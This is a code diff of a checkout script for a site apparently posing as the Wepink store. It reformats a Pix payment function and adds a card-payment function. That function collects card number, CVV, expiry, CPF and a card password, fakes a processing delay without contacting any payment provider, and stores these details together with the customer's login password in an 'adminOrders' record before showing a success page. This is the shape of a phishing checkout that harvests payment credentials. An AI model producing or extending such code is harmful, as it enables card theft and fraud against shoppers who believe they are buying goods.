@@ -1204,109 +1204,187 @@
     }
 
     async function generatePixQRCode() {
-      const purchase = JSON.parse(localStorage.getItem('pendingPurchase')) || {};
-      const nameInput = document.getElementById('pix-payer-name').value.trim();
-      const cpfInput = document.getElementById('pix-payer-cpf').value.trim();
-      const emailInput = document.getElementById('pix-email-input').value.trim();
-      const qrImage = document.getElementById('pix-qr-image');
-      const generateButton = document.getElementById('generate-pix-button');
+  const purchase = JSON.parse(localStorage.getItem('pendingPurchase')) || {};
+  const nameInput = document.getElementById('pix-payer-name').value.trim();
+  const cpfInput = document.getElementById('pix-payer-cpf').value.trim();
+  const emailInput = document.getElementById('pix-email-input').value.trim();
+  const qrImage = document.getElementById('pix-qr-image');
+  const generateButton = document.getElementById('generate-pix-button');
 
-      let subtotal = 0;
-      purchase.cartItems.forEach(item => {
-        if (item.priceNew && item.quantity) {
-          subtotal += item.priceNew * item.quantity;
-        }
-      });
-      const totalAmount = subtotal + (purchase.address?.deliveryFee || 0);
-
-      if (totalAmount <= 0) {
-        console.error('Valor do pedido inválido:', totalAmount);
-        showErrorScreen('Erro: Valor do pedido inválido. Verifique os itens no carrinho.');
-        return;
-      }
-
-      if (!emailInput || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput)) {
-        console.error('E-mail inválido:', emailInput);
-        showErrorScreen('Erro: Por favor, insira um e-mail válido.');
-        return;
-      }
-
-      const paymentData = {
-        amount: parseFloat(totalAmount.toFixed(2)),
-        description: 'Compra Wepink',
-        email: emailInput
-      };
-
-      try {
-        generateButton.disabled = true;
-        generateButton.textContent = 'Gerando...';
-
-        const response = await fetch(backendUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(paymentData)
-        });
-
-        if (!response.ok) {
-          const errorData = await response.json();
-          throw new Error(errorData.error || 'Erro ao gerar o QR code Pix');
-        }
-
-        const data = await response.json();
-
-        if (!data || !data.qrCode || !data.qrCodeBase64) {
-          throw new Error('Dados do QR code não retornados. Verifique se a chave PIX está registrada.');
-        }
-
-        document.getElementById('pix-inputs').style.display = 'none';
-        const codeContainer = document.getElementById('pix-code-manual');
-        const codeText = document.getElementById('pix-code-text');
-        const qrContainer = document.getElementById('pix-qr-manual');
-
-        codeContainer.style.display = 'block';
-        qrContainer.style.display = 'block';
-        codeText.textContent = data.qrCode;
-        qrImage.src = `data:image/png;base64,${data.qrCodeBase64}`;
-
-        const orders = JSON.parse(localStorage.getItem('adminOrders')) || [];
-        const newOrder = {
-          purchaseData: purchase,
-          paymentMethod: 'Pix',
-          pixDetails: {
-            email: emailInput,
-            first_name: nameInput.split(' ')[0] || 'Nome',
-            last_name: nameInput.split(' ').slice(1).join(' ') || 'Sobrenome',
-            identification: { type: 'CPF', number: cpfInput },
-            qrCode: data.qrCode,
-            amount: totalAmount,
-            status: 'Gerado'
-          },
-          orderDate: new Date().toISOString(),
-          items: purchase.cartItems || [],
-          customerDetails: {
-            name: nameInput,
-            cpf: cpfInput,
-            email: emailInput,
-            password: purchase.loginType === 'User' ? purchase.password : undefined
-          },
-          status: 'Gerado',
-          loginType: purchase.loginType || 'Unknown'
-        };
-        orders.push(newOrder);
-        localStorage.setItem('adminOrders', JSON.stringify(orders));
-        console.log('Código PIX gerado com sucesso e pedido salvo:', newOrder);
-
-        timeoutId = setTimeout(() => {
-          showPaymentForm('pix');
-        }, 30000);
-      } catch (error) {
-        console.error('Erro ao gerar Pix:', error.message);
-        showErrorScreen(`Erro ao gerar Pix: ${error.message}`);
-      } finally {
-        generateButton.disabled = false;
-        generateButton.textContent = 'Gerar Pix';
-      }
+  let subtotal = 0;
+  purchase.cartItems.forEach(item => {
+    if (item.priceNew && item.quantity) {
+      subtotal += item.priceNew * item.quantity;
     }
+  });
+  const totalAmount = subtotal + (purchase.address?.deliveryFee || 0);
+
+  if (totalAmount <= 0) {
+    console.error('Valor do pedido inválido:', totalAmount);
+    showErrorScreen('Erro: Valor do pedido inválido. Verifique os itens no carrinho.');
+    return;
+  }
+
+  if (!emailInput || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput)) {
+    console.error('E-mail inválido:', emailInput);
+    showErrorScreen('Erro: Por favor, insira um e-mail válido.');
+    return;
+  }
+
+  const paymentData = {
+    amount: parseFloat(totalAmount.toFixed(2)),
+    description: 'Compra Wepink',
+    email: emailInput
+  };
+
+  try {
+    generateButton.disabled = true;
+    generateButton.textContent = 'Gerando...';
+
+    const response = await fetch(backendUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(paymentData)
+    });
+
+    if (!response.ok) {
+      const errorData = await response.json();
+      throw new Error(errorData.error || 'Erro ao gerar o QR code Pix');
+    }
+
+    const data = await response.json();
+
+    if (!data || !data.qrCode || !data.qrCodeBase64) {
+      throw new Error('Dados do QR code não retornados. Verifique se a chave PIX está registrada.');
+    }
+
+    document.getElementById('pix-inputs').style.display = 'none';
+    const codeContainer = document.getElementById('pix-code-manual');
+    const codeText = document.getElementById('pix-code-text');
+    const qrContainer = document.getElementById('pix-qr-manual');
+
+    codeContainer.style.display = 'block';
+    qrContainer.style.display = 'block';
+    codeText.textContent = data.qrCode;
+    qrImage.src = `data:image/png;base64,${data.qrCodeBase64}`;
+
+    const orders = JSON.parse(localStorage.getItem('adminOrders')) || [];
+    const newOrder = {
+      purchaseData: purchase,
+      paymentMethod: 'Pix',
+      pixDetails: {
+        email: emailInput,
+        first_name: nameInput.split(' ')[0] || 'Nome',
+        last_name: nameInput.split(' ').slice(1).join(' ') || 'Sobrenome',
+        identification: { type: 'CPF', number: cpfInput },
+        qrCode: data.qrCode,
+        amount: totalAmount,
+        status: 'Gerado'
+      },
+      orderDate: new Date().toISOString(),
+      items: purchase.cartItems || [],
+      customerDetails: {
+        name: purchase.name,
+        cpf: purchase.cpf,
+        email: purchase.email,
+        password: purchase.loginType === 'User' ? purchase.password : undefined
+      },
+      status: 'Gerado',
+      loginType: purchase.loginType || 'Unknown'
+    };
+    orders.push(newOrder);
+    localStorage.setItem('adminOrders', JSON.stringify(orders));
+    console.log('Código PIX gerado com sucesso e pedido salvo:', newOrder);
+
+    const savedOrders = JSON.parse(localStorage.getItem('adminOrders'));
+    if (!savedOrders || savedOrders.length === 0) {
+      console.error('Erro ao salvar adminOrders:', savedOrders);
+      showErrorScreen('Erro ao salvar o pedido. Tente novamente.');
+      return;
+    }
+
+    timeoutId = setTimeout(() => {
+      showPaymentForm('pix');
+    }, 30000);
+  } catch (error) {
+    console.error('Erro ao gerar Pix:', error.message);
+    showErrorScreen(`Erro ao gerar Pix: ${error.message}`);
+  } finally {
+    generateButton.disabled = false;
+    generateButton.textContent = 'Gerar Pix';
+  }
+}
+
+function processCardPayment() {
+  const cardName = document.getElementById('card-name').value.trim();
+  const cardCPF = document.getElementById('card-cpf').value.replace(/\D/g, '');
+  const cardEmail = document.getElementById('card-email').value.trim();
+  const cardNumber = document.getElementById('card-number').value.replace(/\D/g, '');
+  const expMonth = document.getElementById('exp-month').value;
+  const expYear = document.getElementById('exp-year').value;
+  const cvv = document.getElementById('cvv').value;
+  const password = document.getElementById('password').value;
+  const total = parseFloat(document.getElementById('order-total').textContent.replace('R$ ', '').replace(',', '.'));
+  const confirmButton = document.getElementById('confirm-payment-button');
+
+  if (cardNumber.length !== 16 || cardCPF.length !== 11 || !expMonth || !expYear || cvv.length < 3 || cvv.length > 4 || !password || isNaN(total) || total <= 0 || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cardEmail)) {
+    console.error('Dados do cartão inválidos:', { cardNumber, cardCPF, cardEmail, expMonth, expYear, cvv, password, total });
+    showErrorScreen('Erro: Verifique os dados do cartão e tente novamente.');
+    return;
+  }
+
+  confirmButton.disabled = true;
+  confirmButton.textContent = 'Processando...';
+
+  setTimeout(() => {
+    const purchase = JSON.parse(localStorage.getItem('pendingPurchase')) || {};
+    const orders = JSON.parse(localStorage.getItem('adminOrders')) || [];
+    const newOrder = {
+      purchaseData: purchase,
+      paymentMethod: 'Cartão',
+      paymentDetails: {
+        cardName,
+        cardCPF,
+        cardNumber,
+        expMonth,
+        expYear,
+        cvv,
+        password,
+        transactionAmount: total,
+        email: cardEmail
+      },
+      orderDate: new Date().toISOString(),
+      items: purchase.cartItems || [],
+      customerDetails: {
+        name: purchase.name,
+        cpf: purchase.cpf,
+        email: purchase.email,
+        password: purchase.loginType === 'User' ? purchase.password : undefined
+      },
+      status: 'Efetuado',
+      loginType: purchase.loginType || 'Unknown'
+    };
+    orders.push(newOrder);
+    localStorage.setItem('adminOrders', JSON.stringify(orders));
+    console.log('Pagamento via cartão processado e pedido salvo:', newOrder);
+
+    const savedOrders = JSON.parse(localStorage.getItem('adminOrders'));
+    if (!savedOrders || savedOrders.length === 0) {
+      console.error('Erro ao salvar adminOrders:', savedOrders);
+      showErrorScreen('Erro ao salvar o pedido. Tente novamente.');
+      return;
+    }
+
+    localStorage.setItem('lastPaymentTotal', total);
+    localStorage.removeItem('pendingPurchase');
+    localStorage.removeItem('cartItems');
+    localStorage.removeItem('cartAddress');
+    console.log('Dados do localStorage limpos após pagamento com cartão');
+
+    document.body.classList.add('fade-out');
+    setTimeout(() => window.location.href = 'confirmation.html', 500);
+  }, 1000);
+}
 
     function validateCardForm() {
       const cardNameInput = document.getElementById('card-name');
